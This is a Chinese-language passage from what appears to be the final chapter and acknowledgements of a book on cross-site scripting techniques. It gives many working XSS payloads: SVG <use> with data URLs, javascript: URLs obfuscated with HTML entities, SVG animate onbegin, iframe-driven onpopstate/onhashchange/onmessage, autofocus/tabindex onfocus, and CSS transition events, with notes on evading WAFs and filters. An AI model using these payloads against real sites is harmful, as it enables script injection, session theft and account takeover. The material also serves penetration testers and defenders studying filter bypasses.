如上述，你可以通过在 SVG 内部使用 `<use>` 元素嵌入 SVG 文档来获取 JavaScript 执行。这生效的前提是文档位于相同域。你也可以使用数据 URL，我将在下方演示：

```svg
<svg><use href='data:image/svg+xml,<svg id="x" xmlns="http://www.w3.org/2000/svg"><image href="1" onerror="alert(1)"/></svg>#x' /></svg>
```

注意，因为数据 URL 使用了有效的 SVG MIME 类型，因此适用更严格的规则。值得注意的是，即使通过此数据 URL，它也不会从空源执行，而是将继承页面的源。

## HTML 实体

HTML 拥有广泛的编码选项。在本节中，我将介绍使用实体编码字符的各种方法，并在每个节的结束时给出几个示例。

### 十进制实体

你可以使用字符代码来表示不同的字符，它们以 `&#` 开头并以可选的分号结尾。对于字符 "j"，表示为字符 106。为了生成此字符，我们只需将前缀与代码结合，后跟一个可选的分号。你还可以在字符代码之前使用任意数量的零：

```html
<a href="&#106;javascript:alert(1337)">test1</a>
<a href="&#0106;javascript:alert(1337)">test2</a>
<a href="&#x00000106;javascript:alert(1337)">test3</a>
```

转换为这种格式很容易，你只需要遍历字符并使用 `codePointAt()` 将字符转换为字符代码：

```javascript
'j'.codePointAt(0)
```

### 十六进制实体

十六进制实体与十进制实体有很多相似之处，但有一个 `x` 前缀。分号也是可选的。

```html
<a href="&#x6a;javascript:alert(1337)">test</a>
```

## onbegin

SVG 包含许多有趣的事件，`onbegin` 会在动画开始时触发，且长度非常短，这对于 XSS 负载总是有利的。要使用它，你需要使用 `<animate>` 标签，并给它一个需要动画的属性以及持续时间：

```svg
<svg><animate onbegin=alert(1) attributeName=x dur=1s></animate></svg>
```

这包含一个 `onload` 标签，它会在动画结束时触发。它需要一个属性来定义持续时间，以及一个属性来执行动画。

## 基于导航的事件

有几个事件需要某种形式的导航才能触发。其中一个事件是 `onpopstate`，它在历史记录发生变化时触发。为了触发此事件，你必须以某种方式更改目标的 URL。这最可能涉及 `iframe`；值得注意的是，当使用跨源 `iframe` 时 `alert(1)` 是不起作用的，你必须使用 `print()` 函数。以下是一些示例：

```html
<body onpopstate=alert(1)><script>location.hash=1</script>
```

```html
<iframe src="//target?x=<body/onpopstate=print()>" onload=this.src+='#'></iframe>
```

你可以使用 `iframe` 来对 URL 的 hash 部分进行修改，从而触发 `hashchange` 事件：

```html
<iframe src="//target?x=<body/onhashchange=print()>" onload=this.src+='#'></iframe>
```

## onmessage

再次使用 `iframe`，你可以加载一个外部 URL 并在其中注入你的 `onmessage` 处理器，然后使用 `postMessage` 触发该事件：

```html
<iframe src="//target?x=<body/onmessage=print()>" onload=this.contentWindow.postMessage('', '*')></iframe>
```

## onfocus

通常，此事件可以通过 `textarea` 或 `input` 的 `autofocus` 属性触发。通过 `tabindex` 和 `id` 属性，可以让该事件在其他元素上生效。`tabindex` 是一个无辅助属性，允许你选择按下 tab 键时页面上哪些元素被选中。通过将其与 `id` 属性结合并 URL 中的 hash，它会自动聚焦该元素：

```html
<x onfocus=alert(1) id=x tabindex=1></x>
```

还有一个技巧，你实际上可以在任何元素上（至少在 Chrome 中）使用 `autofocus` 属性，只要你配合它使用 `tabindex`。这意味着你不需要 `id` 属性或 hash：

```html
<x autofocus onfocus=alert(1) tabindex=1></x>
```

同样，还有一个名为 `autofocus` 的相关事件，你可以用它绕过 WAF 并实现上述行为。

## 基于动画的事件

众所周知，你可以使用 CSS 过渡/动画在任何标签上触发事件。如果你不知道如何操作，请看这里：

```html
<style>:target{color: red;}</style>
<x id=x style="transition:color 10s" ontransitioncancel=print()></x>
somepage.html#x
```

这种方法的原理是使用 `:target` 选择器，当发现 URL hash 部分指定的 id 时更改样式。随后，这会触发事件。这种特定方法的缺点是它会创建一个样式块，这可能会被 WAF 或过滤器拦截。还有另一种方法，你可以使用之前描述的技巧来聚焦元素，因为 Chrome 会为聚焦的元素添加 CSS outline（轮廓），你可以使用过渡效果，因为 outline 的出现会触发事件：

```html
<x id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></x>
somepage.html#x
```

如果你在植入该事件时遇到困难，始终可以使用 `webkit` 变体：

```html
<x id=x style="transition:outline 1s" onwebkittransitionend=alert(1) tabindex=1></x>
somepage.html#x
```

## 总结

我们在这一章涵盖了大量内容。我基本上尝试将我能想到的冷门技巧进行脑力倾倒，或者回答我在 Twitter 上被问到的问题。首先涵盖了如何在没有结束标签的情况下关闭脚本。然后涵盖了如何滥用脚本内部的 HTML 内容、包括 SVG 在内的 HTML 实体，以及如何滥用负载和 Cookie。我们学习了如何使用来源向攻击者控制的服务器发送回声（pingback）。之后，我们演示了一个在 Chrome 中运行的新型 JavaScript 函数 `navigate`。我们涵盖了 JavaScript 中的所有注释以及随后的空白符。稍后，我们展示了如何使用 data URL 进行动态导入。此后，我们涵盖了如何在 XML 文档中获取 HTML。然后我们展示了如何使用 SVG 对象和 `use` 元素。最后，我们涵盖了 HTML 实体，并以一些较为人知的 JavaScript 事件结束了全章。

## 致谢

虽然我写了这本书，但我并不是独立完成的，感谢那些在网络上分享知识的优秀黑客。书中的许多技术都是黑客们在分享知识和共同学习时发现的。

特别感谢：

- James Kettle, Mario Heiderich, Eduardo Vela, Masato Kinugawa, Filedescriptor, LeverOne, Ben Hayak, Alex Inführ, Mathias Karlsson, Jan Horn, Ian Hickey, Gábor Molnár, tsetnep, Psych0tr1a, Skyphire, Abdurah Alqabandi, brainpillow, Kyo, Yosuke Hasegawa, White Jordan, Algol, Jack-masa, wupol, Volk, Robert Hansen, David Lindsay, Superhei, Michal Zalewski, Renaud Lifchitz, Roman Ivanov, Frederik Braun, Krzysztof Kotowicz, Giorgio Maone, GreyMagic, Marcus Niemietz, Sorous Dalili, Stefano Di Paola, Roman Shagfigullin, Lewis Ardern, Michal Bentkowski, S0PAS, avanishi46, Juuso Käenmäki, minno123, itstsn13, Martin Banik, David Granqvist, Andrea (theMiddle) Menin, simpson6, hahwul, Pawel Haldrzyński, Jun Kokatsu, RenwaX23, satarun, har1sec, Yann-C., gadhiyasasan, p4fg, dieofeher, Sergey Bobrov, PwnFunction, Guilherme Keerok, Alex Brasetvik, s1rus, ngykip, the-xentropy, Fzs, Sivakumar, Dwi Sisanto, bmxmn, Tarunkant Gupta, laytonctf
